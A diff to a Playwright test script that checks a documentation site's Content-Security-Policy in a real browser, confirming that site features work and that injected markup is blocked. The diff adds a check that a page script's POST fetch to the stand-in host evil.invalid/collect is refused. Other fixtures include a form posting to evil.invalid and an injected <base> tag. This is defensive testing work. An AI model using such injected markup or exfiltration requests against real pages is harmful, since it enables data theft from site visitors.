@@ -1,15 +1,17 @@
 // The Content-Security-Policy of the pages, in a real browser, from both sides:
 //
 //   1. nothing the site does is blocked by it: on every page, searching, switching projects, the theme
-//      toggle, the drawer and the code-copy buttons run without a single violation or script error;
+//      toggle, the drawer and the code-copy buttons run without a single violation or script error
+//      (search loads its index from the page's own origin; the policy allows no other connection);
 //   2. what it exists for is blocked: markup injected into a built page (an event handler, a
 //      javascript: link, an inline script, a script from another site, a frame, a form, a new <base>)
-//      does nothing, whatever got past the lint and the output assertions.
+//      does nothing, whatever got past the lint and the output assertions, and a script of the page
+//      cannot send anything to another site (connect-src).
 //
 //   bun csp.ts <dist>
 import { resolve } from "node:path";
 import type { Page } from "playwright-core";
-import { launch, routesOf, serve, snapshotOf, stubCatalog } from "./lib.ts";
+import { docsHome, launch, routesOf, serve, stubNetwork } from "./lib.ts";
 
 const [distArg] = process.argv.slice(2).filter((a) => !a.startsWith("--"));
 if (!distArg) {
@@ -17,7 +19,6 @@ if (!distArg) {
   process.exit(2);
 }
 const dist = resolve(distArg);
-const snapshot = snapshotOf(dist);
 let failures = 0;
 const check = (ok: boolean, what: string, detail = "") => {
   if (!ok) failures++;
@@ -51,7 +52,7 @@ async function record(page: Page): Promise<{ violations: () => Promise<string[]>
 // 1. The site under its own policy.
 {
   const context = await browser.newContext({ viewport: { width: 1440, height: 900 } });
-  await stubCatalog(context, snapshot);
+  await stubNetwork(context);
   const page = await context.newPage();
   const seen = await record(page);
   const routes = routesOf(dist);
@@ -86,10 +87,10 @@ async function record(page: Page): Promise<{ violations: () => Promise<string[]>
   await page.waitForTimeout(500);
   check(
     (await page.locator("project-switcher .menu a").count()) > 2,
-    "the project switcher lists the live catalog (a fetch to avunu.net is allowed)",
+    "the project switcher lists the catalog the page was built with (it fetches nothing)",
   );
   await page.setViewportSize({ width: 390, height: 844 });
-  await page.goto(`${origin}/docs/`, { waitUntil: "networkidle" });
+  await page.goto(`${origin}${docsHome(dist)}`, { waitUntil: "networkidle" });
   await page.locator(".menu-btn").click();
   await page.waitForTimeout(300);
   check(
@@ -105,7 +106,7 @@ async function record(page: Page): Promise<{ violations: () => Promise<string[]>
 // 2. What the policy exists for: the page is served with markup that a reader's browser must not run.
 {
   const context = await browser.newContext({ viewport: { width: 1440, height: 900 } });
-  await stubCatalog(context, snapshot);
+  await stubNetwork(context);
   const requested: string[] = [];
   await context.route("https://evil.invalid/**", (route) => {
     requested.push(route.request().url());
@@ -126,7 +127,7 @@ async function record(page: Page): Promise<{ violations: () => Promise<string[]>
     `<form id="f" action="https://evil.invalid/post" method="post"><button id="send">send</button></form>`,
     `<base href="https://evil.invalid/">`,
   ].join("");
-  await context.route(`${origin}/docs/**`, async (route) => {
+  await context.route(`${origin}${docsHome(dist)}**`, async (route) => {
     const response = await route.fetch();
     const body = await response.text();
     await route.fulfill({
@@ -136,7 +137,7 @@ async function record(page: Page): Promise<{ violations: () => Promise<string[]>
   });
   const page = await context.newPage();
   const seen = await record(page);
-  await page.goto(`${origin}/docs/`, { waitUntil: "networkidle" });
+  await page.goto(`${origin}${docsHome(dist)}`, { waitUntil: "networkidle" });
   await page.locator("#jslink").click({ noWaitAfter: true });
   await page.locator("#send").click({ force: true, noWaitAfter: true });
   await page.waitForTimeout(500);
@@ -148,11 +149,19 @@ async function record(page: Page): Promise<{ violations: () => Promise<string[]>
     requested.join(", "),
   );
   check(
-    (await page.evaluate(() => document.baseURI)) === `${origin}/docs/`,
+    (await page.evaluate(() => document.baseURI)) === `${origin}${docsHome(dist)}`,
     "an injected <base> does not move the page's addresses",
   );
+  // the policy allows connections to the page's own origin only: a fetch to another site is refused
+  const fetched = await page.evaluate(() =>
+    fetch("https://evil.invalid/collect", { method: "POST", body: "x" }).then(
+      () => "sent",
+      () => "refused",
+    ),
+  );
+  check(fetched === "refused", "a fetch from the page to another site is refused", fetched);
   const violations = await seen.violations();
-  for (const directive of ["script-src", "frame-src", "form-action", "base-uri"]) {
+  for (const directive of ["script-src", "frame-src", "form-action", "base-uri", "connect-src"]) {
     check(
       violations.some((v) => v.startsWith(directive)),
       `the browser reported the ${directive} violation`,
